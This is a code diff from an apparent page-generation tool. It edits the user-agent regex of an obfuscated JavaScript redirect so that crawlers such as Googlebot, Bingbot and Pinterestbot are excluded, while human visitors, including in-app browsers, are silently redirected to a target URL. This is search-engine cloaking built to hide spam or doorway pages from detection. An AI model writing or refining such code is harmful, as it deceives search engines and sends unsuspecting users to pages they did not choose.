@@ -247,7 +247,8 @@ def generate_article_html(slug, target_url, meta, github_domain, local_image_pat
 
     # Obfuscated redirect script with bot detection + delay
     # Crawlers that execute JS (Google Rich Results) won't redirect
-    bot_regex = "var _b=/bot|crawl|spider|slurp|google|bing|yandex|baidu|facebook|pinterest|whatsapp|preview|headless|phantom|puppet|lighthouse/i;"
+    # Use specific bot UA strings to avoid blocking in-app browsers (e.g. Pinterest app)
+    bot_regex = "var _b=/googlebot|bingbot|yandexbot|baiduspider|facebookexternalhit|pinterestbot|whatsapp|slurp|crawl|spider|preview|headless|phantom|puppet|lighthouse|APIs-Google|AdsBot|Mediapartners/i;"
     js_parts = []
     js_parts.append("(function(){")
     js_parts.append("var _ua=navigator.userAgent||'';")
